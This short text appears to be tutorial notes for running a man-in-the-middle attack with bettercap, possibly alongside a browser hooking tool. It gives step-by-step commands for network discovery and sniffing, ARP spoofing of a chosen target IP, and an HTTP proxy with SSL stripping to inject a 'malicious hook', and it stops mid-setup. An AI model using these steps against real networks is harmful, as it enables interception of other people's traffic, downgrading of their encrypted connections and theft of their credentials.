For using it in combination with bettercap, we will first identify our ip - ifconfig - (to confirm your ip type most probably eth0)
sudo bettercap -iface eth0 (for the better cap interface to run and start our man in the middle attack)
For our attack we need 3 main modules to activate net.probe , net.reckon , net.sniff
type thier name and on next to them, to check wheather they are running or not type help
We also need 2 more modules arp.spoof and http.proxy (for man in the middle attack and malicious hook)
net.show to see all the devices on your network.
set arp.spoof.targets -ip of the target- .
arp.spoof on.
set http.proxy.sslstrip
